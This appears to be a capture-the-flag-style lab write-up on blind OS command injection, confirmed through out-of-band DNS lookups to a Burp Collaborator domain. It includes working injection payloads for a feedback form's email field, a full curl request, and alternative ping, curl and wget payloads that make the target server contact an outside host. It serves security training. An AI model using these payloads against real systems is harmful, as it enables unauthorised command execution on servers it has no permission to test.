# Blind OS command injection with out-of-band interaction — Practitioner

**Status:** Solved

---

## Goal

Confirm command injection by making the server send a DNS/HTTP request to your Burp Collaborater server.

---

## Steps (simple & complete)

1. **Setup Burp Collaborator**
   - Go to Burp Suite → Burp menu → Burp Collaborator client
   - Click "Copy to clipboard" to get your unique domain
   - Example: `abc123.burpcollaborator.net`

2. **Find injection point**
   - Submit feedback form
   - Intercept request in Burp
   - Email field is vulnerable

3. **Inject DNS lookup command**
```
   email=x||nslookup burp-collab-domain||
```
   - Replace `burp-collab-domain` with your actual domain

4. **Execute the injection**
```bash
   email=x||nslookup abc123.burpcollaborator.net||
```
   
   Full request:
```bash
   curl -X POST "https://TARGET/feedback/submit" \
     -d "email=x||nslookup abc123.burpcollaborator.net||&name=test&subject=test&message=test"
```

5. **Check Collaborator**
   - Go back to Burp Collaborator client
   - Click "Poll now"
   - You should see DNS lookups from the target server!

6. **Lab solved**
   - Once DNS interaction appears in Collaborator

---

## Example

**Injection:**
```
email=test||nslookup abc123.burpcollaborator.net||
```

**Collaborator shows:**
```
DNS Query: abc123.burpcollaborator.net
From: 10.20.30.40
Type: A
```

This proofs the server executed your command!

---

## Alternative payloads

Try these if nslookup doesnt work:
```
||ping -c 3 abc123.burpcollaborator.net||
||curl http://abc123.burpcollaborator.net||
||wget http://abc123.burpcollaborator.net||
```

---

